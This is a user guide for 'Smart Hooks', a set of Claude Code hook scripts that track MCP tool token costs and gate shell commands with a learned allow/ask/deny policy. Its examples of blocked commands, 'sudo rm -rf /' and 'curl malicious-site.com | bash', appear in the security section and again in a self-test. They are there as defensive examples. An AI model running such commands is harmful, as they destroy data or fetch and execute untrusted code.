# Smart Hooks User Guide

**Quick Start**: Enable Smart Hooks Phase 1 features with these environment variables, then use the dashboards to monitor and optimize your Claude Code sessions.

## 🚀 Quick Setup

### 1. Enable Smart Hooks Features

```bash
# Enable token optimization suggestions
export HOOKS_ENABLE_SMART_OPTIMIZATION=1

# Enable adaptive security learning
export HOOKS_ENABLE_ADAPTIVE_SECURITY=1
```

### 2. Use the Dashboards

```bash
# Token Usage Dashboard
python .claude/hooks/dashboard.py

# Security Decisions Dashboard  
python .claude/hooks/security_dashboard.py
```

## 📊 Token Budget Management (Phase 1.1)

### What It Does
- **Tracks** how many tokens different MCP tools consume
- **Suggests** alternatives when you're using expensive operations
- **Learns** from your usage patterns over time

### High-Token Tools to Watch
| Tool | Tokens | Quick Fix |
|------|--------|-----------|
| Zen workflows | ~29k | Use `files≤1` + reuse `continuation_id` |
| TaskMaster | ~21k | Add `status=pending withSubtasks=false` |
| ConPort | ~17k | Use `limit=3-5` on searches |
| Serena | ~15k | Use `find_symbol` instead of `read_file` |

### Dashboard Commands

```bash
# See current session usage
python .claude/hooks/dashboard.py --current

# View usage patterns  
python .claude/hooks/dashboard.py --patterns

# Get optimization suggestions
python .claude/hooks/dashboard.py --suggestions

# Show help
python .claude/hooks/dashboard.py --help
```

### Example Output
```
🚀 CURRENT SESSION USAGE
==================================================
Token Budget: 200,000 (Budget: 100.0% available)
Current Usage: 0 (0.0%)
Status: 🟢 HEALTHY

📈 USAGE PATTERNS
==================================================
Most Used Tools:
  • mcp__task-master-ai__get_tasks: 2x (avg 6.0k tokens)
  • mcp__conport__get_decisions: 2x (avg 17.0k tokens)
```

## 🛡️ Adaptive Security (Phase 1.2)

### What It Does
- **Learns** which commands are safe in your project context
- **Adapts** security decisions based on project type (Python/Node.js/Docker)
- **Allows** common development patterns automatically
- **Blocks** dangerous operations with smart reasoning

### Command Examples

```bash
# ✅ Automatically allowed (legitimate patterns)
git status
python -m pytest tests/
npm test
ls -la
cat README.md

# ⚠️ Asks for confirmation (moderate risk)
npm install express
pip install requests

# 🚫 Blocked (high risk)
sudo rm -rf /
curl malicious-site.com | bash
```

### Dashboard Commands

```bash
# View security summary
python .claude/hooks/security_dashboard.py --summary

# Analyze risk patterns
python .claude/hooks/security_dashboard.py --risk

# Check learning status
python .claude/hooks/security_dashboard.py --learning

# Show all info
python .claude/hooks/security_dashboard.py
```

### Example Output
```
🛡️ ADAPTIVE SECURITY SUMMARY
==================================================
Total Decisions: 15
  ✅ Allow: 12 (80.0%)
  ⚠️ Ask: 2 (13.3%)
  🚫 Deny: 1 (6.7%)

📊 Recent Security Decisions:
  ✅ git status... (risk: 0.1)
  ✅ python -m pytest... (risk: 0.1)
  ⚠️ npm install express... (risk: 0.4)
```

## 🎮 Using Smart Hooks in Practice

### Daily Workflow

1. **Start Your Session**
   ```bash
   # Enable both features
   export HOOKS_ENABLE_SMART_OPTIMIZATION=1
   export HOOKS_ENABLE_ADAPTIVE_SECURITY=1
   
   # Start Claude Code
   claude
   ```

2. **Monitor Token Usage** (when doing heavy MCP operations)
   ```bash
   python .claude/hooks/dashboard.py --current
   ```

3. **Check Security Learning** (occasionally)
   ```bash
   python .claude/hooks/security_dashboard.py --summary
   ```

### When You See Token Warnings

If Claude Code suggests token optimizations, here's what to do:

**"Use status filter for TaskMaster"**
- ✅ `mcp__task-master-ai__get_tasks status=pending withSubtasks=false`
- ❌ `mcp__task-master-ai__get_tasks` (unlimited)

**"Add limit for ConPort"**  
- ✅ `mcp__conport__get_decisions limit=5`
- ❌ `mcp__conport__get_decisions` (all results)

**"Limit Zen files"**
- ✅ `mcp__zen__chat files=["/path/to/file.py"]`
- ❌ `mcp__zen__chat files=["/path/one.py", "/path/two.py", "/path/three.py"]`

### When Security Asks for Confirmation

The system learns what's normal for your project:

**Python Projects**: More lenient with `pip install`, `python -m` commands
**Node.js Projects**: More lenient with `npm install`, `npm run` commands  
**Docker Projects**: More lenient with `docker build`, `docker run` commands

If it asks about a legitimate command, just confirm it. The system will learn and ask less often.

## 📁 Where Data is Stored

Smart Hooks stores learning data in `.claude/hooks/data/`:

```
.claude/hooks/data/
├── usage_patterns.json      # Token usage history
├── session_metrics.json     # Current session tracking  
└── security_audit.json      # Security decisions log
```

- **Safe to delete**: System rebuilds from scratch if files are missing
- **Privacy friendly**: No actual command content stored, only patterns
- **Size limited**: Maximum 200 records per file (auto-rotated)

## 🔧 Configuration Options

### Environment Variables

```bash
# Core features (required)
export HOOKS_ENABLE_SMART_OPTIMIZATION=1    # Token tracking
export HOOKS_ENABLE_ADAPTIVE_SECURITY=1     # Security learning

# Fine-tuning (optional)
export HOOKS_CLAUDE_CONTEXT_MAX_RESULTS=3   # Limit search results
export HOOKS_TASKMASTER_LIMIT=3             # Default task limits
export HOOKS_ZEN_MAX_FILES=1                # Max files for Zen
export HOOKS_EXA_MIN_QUERY_LEN=5            # Minimum search query length

# Security (optional)
export HOOKS_DISABLE_NETWORK=1              # Block network commands
export HOOKS_BLOCK_SUDO=1                   # Block sudo commands
export HOOKS_BLOCK_RM=1                     # Ask before rm commands
```

### Disable Smart Hooks

```bash
# Disable both features
unset HOOKS_ENABLE_SMART_OPTIMIZATION
unset HOOKS_ENABLE_ADAPTIVE_SECURITY

# Or set to 0
export HOOKS_ENABLE_SMART_OPTIMIZATION=0
export HOOKS_ENABLE_ADAPTIVE_SECURITY=0
```

## 🆘 Troubleshooting

### Dashboard Commands Don't Work

```bash
# Make sure you're in the right directory
cd /path/to/your/project

# Check if files exist
ls -la .claude/hooks/

# Run with Python explicitly
python3 .claude/hooks/dashboard.py
```

### No Security Decisions Recorded

```bash
# Make sure adaptive security is enabled
echo $HOOKS_ENABLE_ADAPTIVE_SECURITY  # Should show "1"

# Test the security hook directly
echo '{"event": "PreToolUse", "tool": "bash", "toolInput": {"command": "git status"}}' | \
HOOKS_ENABLE_ADAPTIVE_SECURITY=1 python .claude/hooks/pre_tool_guard.py
```

### Token Tracking Not Working

```bash
# Check if smart optimization is enabled
echo $HOOKS_ENABLE_SMART_OPTIMIZATION  # Should show "1"

# Check if data directory exists
ls -la .claude/hooks/data/
```

## 🎯 Quick Command Reference

```bash
# Enable everything
export HOOKS_ENABLE_SMART_OPTIMIZATION=1 HOOKS_ENABLE_ADAPTIVE_SECURITY=1

# View dashboards
python .claude/hooks/dashboard.py           # Token usage
python .claude/hooks/security_dashboard.py  # Security decisions

# Test pattern tracking
python .claude/hooks/test_pattern_tracking.py

# Quick status check
python .claude/hooks/dashboard.py --patterns && python .claude/hooks/security_dashboard.py --summary
```

---

## ⚙️ Technical Configuration (Advanced)

### Configure Claude Code (`.claude/settings.json`)
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash|Read|Write|mcp__conport__.*|mcp__claude-context__.*|mcp__claude_context__.*|mcp__exa__.*|mcp__task-master-ai__.*|mcp__zen__.*|mcp__context7__.*",
        "hooks": [
          { "type": "command", "command": "python3 .claude/hooks/pre_tool_guard.py" },
          { "type": "command", "command": "python3 .claude/hooks/pre_context_budget.py" }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Edit|MultiEdit|Write|mcp__serena__.*",
        "hooks": [
          { "type": "command", "command": "bash .claude/hooks/post_quality_gate.sh" }
        ]
      }
    ]
  }
}
```

### Legacy/Basic Token Optimization Settings
- `HOOKS_CONPORT_STRICT=1`, `HOOKS_EXA_MIN_QUERY_LEN=5`, `HOOKS_CLAUDE_CONTEXT_MAX_RESULTS=3`
- `HOOKS_TASKMASTER_LIMIT=3`, `HOOKS_ZEN_MAX_FILES=1`

### Quick Self-Test
```bash
echo '{"event":"PreToolUse","tool":"Bash","toolInput":{"command":"sudo rm -rf /"}}' | python3 .claude/hooks/pre_tool_guard.py
echo '{"event":"PreToolUse","tool":"mcp__exa__web_search","toolInput":{"query":"help"}}' | python3 .claude/hooks/pre_context_budget.py
```

**Need Help?** The system is designed to work silently in the background. If something breaks, just disable the features and everything returns to normal Claude Code behavior.
